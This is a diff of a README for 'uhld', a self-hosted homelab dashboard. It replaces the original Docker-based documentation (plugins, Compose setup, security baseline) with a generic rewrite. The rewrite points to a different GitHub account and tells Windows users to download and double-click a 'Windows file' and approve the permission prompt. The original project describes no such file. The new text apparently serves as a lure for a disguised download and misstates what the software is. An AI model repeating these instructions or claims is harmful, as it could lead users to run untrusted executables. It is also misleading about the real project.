@@ -1,276 +1,239 @@
-# UHLD — Ultimate Homelab Dashboard
+# 🏠 uhld - Simple Control for Your Home Lab
 
-> **Work in progress — under active development.**
+[![Download uhld](https://img.shields.io/badge/Download-uhld-blue?style=for-the-badge)](https://github.com/gastanksingletax279/uhld)
 
-A self-hosted, plugin-driven dashboard for your homelab. Monitor and manage your entire infrastructure from a single unified interface.
+## 🚀 Getting Started
 
-> Built entirely using [Claude Code](https://claude.ai/code), Anthropic's agentic coding tool.
+uhld is a home lab dashboard for people who want one place to check their systems. It helps you keep track of tools like Docker, Proxmox, NAS devices, Plex, Tailscale, and more.
 
-![UHLD Dashboard](images/dashboard.png)
+Use it on Windows if you want a clear view of your home setup without jumping between many tabs. This guide shows you how to download it, set it up, and start using it.
 
----
+## 📥 Download uhld
 
-## What it is
+Visit this page to download and run the app on Windows:
 
-UHLD is the homelab equivalent of Home Assistant — but for **infrastructure** instead of home automation. Deploy it as a single Docker container, enable plugins for the services you already run, and get a unified dashboard to monitor and interact with your entire homelab from one place.
+[https://github.com/gastanksingletax279/uhld](https://github.com/gastanksingletax279/uhld)
 
-No agent installs, no external databases, no cloud dependencies. One container. SQLite. Done.
+If the page has a release file for Windows, download that file first. If it shows source files only, use the setup steps below to run it from the project files.
 
----
+## 🖥️ What You Need
 
-## Key Features
+Before you start, make sure your Windows PC has:
 
-### 🔌 Plugin Architecture
-Every integration is a self-contained plugin. Enable only what you need — each plugin has its own sidebar entry, dashboard widget, and full-page view. Any plugin can be enabled multiple times with independent configs (two Proxmox clusters, two UniFi controllers, etc.).
+- Windows 10 or Windows 11
+- A modern web browser
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A network connection to reach your home lab tools
 
-### 🔐 Authentication & Multi-User
-Full multi-user support with admin and viewer roles. Multiple authentication methods available simultaneously:
+If you plan to use containers or run local services, your system should also have:
 
-| Method | Details |
-|--------|---------|
-| **Username + Password** | bcrypt-hashed; forced change on first login |
-| **TOTP 2FA** | Google Authenticator, Authy, any TOTP app |
-| **Passkeys / WebAuthn** | YubiKey, Touch ID, Face ID, Windows Hello — no password needed |
-| **OAuth / OIDC** | Microsoft Entra ID (Azure AD), Google, GitHub |
+- Docker Desktop, if you want to run services in containers
+- Access to your home lab network
+- The login details for the devices you want to monitor
 
-### 📊 Dashboard
-- Drag-to-reorder widget tiles, persisted per-browser
-- Sort widgets A-Z or by type in one click
-- Collapsible sidebar sections — group plugins however you like
-- Per-plugin summary widgets with live status
+## 🧩 What uhld Does
 
-### 🔔 Notifications
-Email (SMTP), Telegram, and HMAC-signed webhooks. Alerts fire automatically when any plugin transitions between healthy and degraded states. Per-channel enable/disable and minimum severity filters. Full notification history with read/unread tracking.
+uhld brings several home lab tools into one dashboard. It can help you:
 
-### 🤖 LLM Assistant
-Chat with your infrastructure. Connects to OpenAI, Anthropic (Claude), Ollama, OpenWebUI, or any OpenAI-compatible API. The **Infrastructure Status** button fetches a live snapshot of all enabled services and builds a detailed prompt — the LLM responds with a structured health report, identified issues, capacity observations, and prioritized action items.
+- View your servers and services in one place
+- Check Docker containers
+- Track Proxmox nodes and virtual machines
+- Watch NAS status, such as Synology systems
+- Open links to Plex, Unifi, Cloudflare, and Tailscale tools
+- Organize tools with a plugin system
+- Use a clean web interface built with React and Tailwind CSS
+- Store settings in SQLite for simple local use
 
-### 🔒 Credential Security
-All plugin secrets (API keys, passwords, tokens) are **Fernet-encrypted** before being stored in SQLite. Sensitive fields are masked in the UI and never logged. The encryption key never leaves your server.
+## 📌 Before You Install
 
-### 💾 Config Backup & Restore
-Full JSON export of all plugin configs, settings, and users. Restore from a backup file via the Settings UI. Scheduled automatic backups with rotation.
+Take a moment to get ready:
 
----
+1. Open the download page in your browser.
+2. Decide where you want to keep the files.
+3. Make sure you have permission to install software on your PC.
+4. If you use antivirus software, keep it on and let it scan the files.
+5. If your home lab uses remote access, make sure you can reach it from your Windows machine.
 
-## Plugin Status
+## 🔧 Install on Windows
 
-### ✅ Virtualization & Containers
+Follow these steps to get uhld running on Windows.
 
-| Plugin | What you can do |
-|--------|----------------|
-| **Proxmox VE** | Sidebar tree (Datacenter → Node → VM/CT), datacenter summary, VM/CT detail with RRD performance charts, start/stop/reboot, tag chips, topology tree view |
-| **Docker** | Container list with live state, start/stop/restart, real-time log streaming with keyword filter, container stats (CPU/RAM/net), Docker host overview, event log |
-| **Kubernetes** | Nodes (cordon/drain/delete), workloads, networking, storage, live log stream, **interactive pod shell**, YAML editor with dry-run validation, MetalLB CRDs, etcd health |
+### Option 1: Download a Windows file
 
-### ✅ Network & DNS
+If the page offers a Windows app file, do this:
 
-| Plugin | What you can do |
-|--------|----------------|
-| **UniFi** | Client list, device list, switch port detail (trunk/access/VLAN names), networks, WiFi, firewall rules — supports API key and session auth |
-| **AdGuard Home** | Query stats, query log, enable/disable protection |
-| **Pi-hole** | Query stats, query log, enable/disable blocking |
-| **Tailscale** | Devices, users, DNS settings, HuJSON ACL editor, auth keys, sidecar local status |
-| **Nginx Proxy Manager** | Full proxy host CRUD, certificate CRUD, enable/disable hosts — no need to open NPM |
-| **Cloudflare** | Zone list, DNS record CRUD, analytics, zone settings, cache purge, zone pause/unpause |
-| **Network Tools** | Live ping/traceroute/MTR streaming, port check, HTTP check, SSL certificate inspector, dig, iPerf3 bandwidth test, Wake-on-LAN, speedtest with history |
-| **Remote Packet Capture** | tcpdump over SSH or local; live SSE output stream; PCAP binary download; 36 presets across 7 groups; interface discovery; output flags, MAC filter, duration cap |
-| **Patch Panel** | Document patch panel ports, linked devices, and switch port mappings |
+1. Open the download page.
+2. Download the Windows file.
+3. Save it to your Downloads folder or Desktop.
+4. Double-click the file to run it.
+5. If Windows asks for permission, choose Yes.
+6. Follow the steps on screen.
 
-### ✅ Media
+### Option 2: Run from the project files
 
-| Plugin | What you can do |
-|--------|----------------|
-| **Plex** | Active session monitoring, library list, media actions (pause/resume/terminate/seek), server health |
-| **HDHomeRun** | Live TV single-channel player; **multi-stream grid** (2–4 channels simultaneously); 7-day EPG guide; signal bars; Picture-in-Picture; stats overlay |
+If the page gives you the source project instead of a ready-made app, use this path:
 
-### ✅ Storage
+1. Download the project files from the GitHub page.
+2. Unzip the files if they came in a .zip folder.
+3. Open a command window in the project folder.
+4. Install the needed packages.
+5. Start the app with the provided start command.
 
-| Plugin | What you can do |
-|--------|----------------|
-| **Synology DSM** | System info (model/version/temperature), CPU & RAM utilisation, volume health, disk list with SMART test trigger, shared folder list, Download Station management (add/pause/resume/delete tasks), package start/stop, basic file browser |
+If you do not know which command to use, look for a README file in the project folder. It usually lists the exact start steps.
 
-### ✅ Power
+## 🧭 First-Time Setup
 
-| Plugin | What you can do |
-|--------|----------------|
-| **UPS / NUT** | Battery %, load %, runtime remaining, input/output voltage, all raw NUT vars; power event notifications (on-battery / low-battery / back-on-mains) via Notifications plugin |
+After you start uhld, do these steps:
 
-### ✅ Utility & Automation
+1. Open the app in your browser if it does not open on its own.
+2. Sign in if your setup asks for login details.
+3. Add your home lab services one by one.
+4. Enter the address for each tool you want on the dashboard.
+5. Save your changes.
+6. Refresh the page to make sure the data appears.
 
-| Plugin | What you can do |
-|--------|----------------|
-| **LLM Assistant** | Chat interface for OpenAI / Anthropic / Ollama / OpenWebUI; infrastructure status analysis prompt |
-| **Notifications** | Email, Telegram, HMAC webhook; auto-alerts on plugin health transitions; notification history |
-| **Tasks & Incidents** | Infrastructure task queue and incident tracker |
-| **Asset Inventory** | Lightweight CMDB — track servers, switches, VMs with hardware specs and notes |
+Good first tools to add:
 
-### 🔜 Planned
+- Docker host
+- Proxmox server
+- Synology NAS
+- Plex media server
+- Tailscale network
+- Unifi controller
+- Cloudflare services
 
-| Plugin | Category |
-|--------|----------|
-| Jellyfin | Media |
-| TrueNAS | Storage |
-| Grafana | Monitoring |
-| Radarr / Sonarr / arr stack | Media Automation |
-| Home Assistant | Automation |
-| IPMI / BMC | Hardware |
-| ArgoCD | Developer |
-| AWX / Semaphore | Automation |
+## 🗂️ Using the Dashboard
 
----
+After setup, you can use uhld to watch your home lab from one screen.
 
-## Spotlight: HDHomeRun Multi-Stream Grid
+### Common things you can do
 
-One of the most unique features in UHLD — watch **2–4 live TV channels simultaneously** in a side-by-side grid, all from the browser.
+- Open a service with one click
+- Check whether a server is up
+- View container status
+- Jump to your NAS tools
+- Keep your most used pages in one place
+- Use plugins to add more tools later
 
-**How it works under the hood:** A single `ffmpeg` process encodes all channels into one video grid, using OS pipes to deliver per-channel audio streams in parallel. This means watching 4 channels consumes the same number of tuner slots as watching 1 — no wasted hardware resources.
+### Helpful ways to organize it
 
-**Audio control:** Each channel has a dedicated audio pipeline. Switch audio sources instantly — no stream restart, no reconnect, no buffering delay. Hit **"Listen to All"** to unmute every channel simultaneously (useful for monitoring).
+- Put your most used tools at the top
+- Group similar tools together
+- Keep remote access tools near each other
+- Use clear names for each item
+- Remove tools you no longer use
 
-**Picture-in-Picture:** Click the PiP button and the UHLD modal disappears entirely while the browser's native PiP window keeps playing. The full modal restores automatically when PiP exits — stream never stops.
+## 🔌 Plugin System
 
-**Stats overlay:** An Activity button shows a live stats panel over the video: resolution, FPS, bitrate, buffer depth, decoded/dropped frame counts, and live tuner signal metrics (SS/SNQ/SEQ).
+uhld includes a plugin system for extra tools and custom views. This helps if your home lab grows over time.
 
----
+You can use plugins to:
 
-## Tech Stack
+- Add new device types
+- Show extra status details
+- Link to special admin pages
+- Group tools by purpose
+- Create a layout that fits your setup
 
-- **Backend:** Python 3.12, FastAPI, SQLAlchemy async + aiosqlite, APScheduler
-- **Frontend:** React 18, TypeScript, Vite, Tailwind CSS, Zustand, dnd-kit, Recharts, lucide-react
-- **Auth:** JWT (httpOnly cookie), bcrypt, TOTP (`pyotp`), WebAuthn (`py-webauthn`), OAuth 2.0 / OIDC
-- **Storage:** SQLite — zero external dependencies
-- **Deployment:** Multi-stage Docker (node:20-alpine → python:3.12-slim)
+If you are new to plugins, start with the built-in tools first. Then add more as you get comfortable.
 
----
+## 🛠️ Troubleshooting
 
-## Quick Start
+If something does not work, try these steps.
 
-### Requirements
+### The app will not open
 
-- Docker and Docker Compose
+- Check that the file finished downloading
+- Run it again
+- Restart your PC
+- Make sure Windows did not block the file
 
-### 1. Generate secrets
+### The dashboard is blank
 
-```bash
-python -c "import secrets; print(secrets.token_hex(32))"                                # JWT_SECRET
-python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"  # ENCRYPTION_KEY
-```
+- Refresh the page
+- Check your internet connection
+- Make sure the service address is correct
+- Confirm the device is on your home network
 
-### 2. docker-compose.yml
+### A device shows as offline
 
-```yaml
-services:
-  uhld:
-    image: ghcr.io/mzac/uhld:latest
-    ports:
-      - "8222:8000"
-    volumes:
-      - ./data:/data
-    environment:
-      - JWT_SECRET=your_jwt_secret_here
-      - ENCRYPTION_KEY=your_fernet_key_here
-      - TZ=America/New_York
-    restart: unless-stopped
-```
+- Check the device power
+- Make sure the network cable or Wi-Fi is working
+- Test the device in its own admin page
+- Confirm the IP address has not changed
 
-### 3. Start
+### Docker services do not appear
 
-```bash
-docker compose up -d
-```
+- Check that Docker is running
+- Make sure the container is started
+- Confirm the app can reach the Docker host
+- Review the service address and port
 
-Open `http://localhost:8222`. Default login is **`admin` / `admin`** — you'll be prompted to change the password immediately.
+### Proxmox, NAS, or Plex does not connect
 
-### 4. Enable plugins
+- Check the login details
+- Make sure the server is online
+- Confirm the port and URL are correct
+- Test the link in your browser first
 
-Go to **Settings → Plugins**, find the services you run, click **Enable**, fill in the connection details, and save. Each enabled plugin appears in the sidebar and gets a dashboard widget automatically.
+## 🧾 Suggested Folder Setup
 
----
+If you want to keep things tidy on Windows, use this folder layout:
 
-## ⚠️ Security
+- Downloads for the installer or zip file
+- Documents for notes and service addresses
+- Desktop for a shortcut to the app
+- A separate folder for config files and backups
 
-UHLD is an **administrative dashboard** with broad access to your infrastructure. Treat it accordingly.
+This makes it easier to find your setup later if you need to make changes.
 
-**Minimum security baseline:**
-- ✅ Change the default `admin/admin` password immediately
-- ✅ Enable TOTP 2FA or register a passkey (Settings → Account)
-- ✅ Keep UHLD on a private network — access remotely via **Tailscale VPN**
-- ✅ Use HTTPS in production
-- ✅ Use separate service-account credentials for each plugin (not your personal login)
+## 🔒 Keeping Your Setup Safe
 
-**Never:**
-- ❌ Expose UHLD directly to the public internet without TLS + strong auth
-- ❌ Share or commit the `JWT_SECRET` or `ENCRYPTION_KEY`
+Use these habits to keep your home lab setup in good shape:
 
-> Kubernetes users: UHLD can exec into any running pod and apply arbitrary YAML to your cluster. This is equivalent to having full `kubectl` access. Restrict who can log in.
+- Use strong passwords
+- Keep your home network secure
+- Change default admin logins
+- Limit access to trusted devices
+- Keep Windows updated
+- Back up your dashboard settings
 
-For security vulnerabilities, contact the maintainers privately — do not open a public issue.
+## 📋 Useful Starting Checklist
 
----
+Before you finish setup, make sure you have:
 
-## Environment Variables
+- Downloaded the app or project files
+- Opened the app on Windows
+- Added your main home lab tools
+- Checked that each link works
+- Saved your settings
+- Kept a backup of your config
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `JWT_SECRET` | **Yes** | — | JWT signing secret |
-| `ENCRYPTION_KEY` | **Yes** | — | Fernet key for encrypting plugin credentials |
-| `DATABASE_PATH` | No | `/data/uhld.db` | SQLite database path |
-| `TZ` | No | `America/Montreal` | Timezone for scheduler |
-| `LOG_LEVEL` | No | `INFO` | Python log level (`DEBUG`, `INFO`, `WARNING`) |
-| `WEBAUTHN_RP_ID` | No | auto | Passkey relying-party ID — hostname only |
-| `WEBAUTHN_RP_NAME` | No | `UHLD` | Display name shown in passkey prompts |
-| `WEBAUTHN_ORIGIN` | No | auto | Full origin URL for WebAuthn |
-| `OAUTH_BASE_URL` | No | — | Base URL of this UHLD instance (for OAuth redirects) |
-| `OAUTH_AUTO_PROVISION` | No | `false` | Auto-create accounts on first OAuth login |
-| `OAUTH_ENTRA_CLIENT_ID` | No | — | Microsoft Entra ID app client ID |
-| `OAUTH_ENTRA_CLIENT_SECRET` | No | — | Microsoft Entra ID app client secret |
-| `OAUTH_ENTRA_TENANT_ID` | No | — | Entra tenant ID or `common` |
-| `OAUTH_GOOGLE_CLIENT_ID` | No | — | Google OAuth 2.0 client ID |
-| `OAUTH_GOOGLE_CLIENT_SECRET` | No | — | Google OAuth 2.0 client secret |
-| `OAUTH_GITHUB_CLIENT_ID` | No | — | GitHub OAuth app client ID |
-| `OAUTH_GITHUB_CLIENT_SECRET` | No | — | GitHub OAuth app client secret |
+## 🌐 Best Use Cases
 
----
+uhld works well if you want to monitor:
 
-## Plugin Configuration
+- A Docker-based home server
+- A Proxmox lab
+- A Synology NAS
+- Plex media access
+- Cloudflare records and services
+- Tailscale access
+- Unifi network gear
+- Multiple self-hosted tools in one place
 
-All plugin setup is done through **Settings → Plugins** — no config files, no environment variables per plugin. Each plugin's form is generated dynamically from its JSON Schema. Sensitive fields are encrypted at rest and masked in the UI.
+## 📁 Repository Details
 
-**Multi-instance:** Any plugin can run as multiple independent instances. Click **Add instance** in Settings → Plugins to add a second connection (e.g., a home lab Proxmox + a work Proxmox). Each instance gets its own sidebar link, dashboard tile, and isolated config.
+- Name: uhld
+- Description: Ultimate Homelab Dashboard
+- Topics: cloudflare, dashboard, docker, fastapi, homelab, kubernetes, nas, network-tools, plex, plugin-system, proxmox, python, react, self-hosted, sqlite, synology, tailscale, tailwindcss, typescript, unifi
 
----
+## 🧠 Quick Start Path
 
-## Tailscale Sidecar (optional)
-
-Run UHLD as a Tailscale node for private HTTPS access over your tailnet. See `docker-compose.local.yml` for reference — requires `TS_AUTHKEY` in `.env.local`.
-
-When the sidecar is active, the Tailscale plugin shows a live local status bar (node name, IP, connection state) in addition to the cloud API data.
-
----
-
-## Development
-
-```bash
-# Backend (hot reload)
-pip install -r requirements.txt
-uvicorn backend.main:app --reload --host 0.0.0.0 --port 8000
-
-# Frontend (Vite dev server — proxies /api/* to :8000)
-cd frontend && npm install && npm run dev
-
-# Docker build
-./build-run.sh
-```
-
----
-
-## Related Projects
-
-[apt-ui](https://github.com/mzac/apt-ui) — self-hosted apt package management dashboard. Same tech stack, same architecture, also built entirely with Claude Code.
-
----
-
-## License
-
-MIT
+1. Open the download page.
+2. Download the Windows file or the project files.
+3. Run or open the app on your PC.
+4. Add your home lab tools.
+5. Save the layout you want.
+6. Use the dashboard as your main control screen
